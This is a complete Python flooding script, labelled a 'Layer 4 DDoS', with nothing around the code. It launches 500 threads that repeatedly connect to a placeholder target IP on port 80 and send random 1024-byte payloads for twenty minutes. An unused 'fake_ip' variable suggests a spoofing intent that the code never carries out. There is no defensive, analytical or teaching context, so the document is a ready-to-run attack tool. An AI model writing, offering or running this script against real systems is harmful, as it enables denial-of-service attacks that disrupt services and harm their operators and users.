import socket
import threading
import random
import time

target_ip = "TARGET_IP"
target_port = 80
fake_ip = "182.21.20.32"
threads = 500
payload_size = 1024
attack_time = 1200  # seconds

def generate_payload():
    return random._urandom(payload_size)

def attack():
    payload = generate_payload()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(payload, (target_ip, target_port))
            for _ in range(10):
                s.send(payload)
            s.close()
        except:
            pass

print(f"Starting Layer 4 DDoS on {target_ip}:{target_port} with {threads} threads")
start_time = time.time()

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

while time.time() - start_time < attack_time:
    time.sleep(1)

print("Attack finished.")
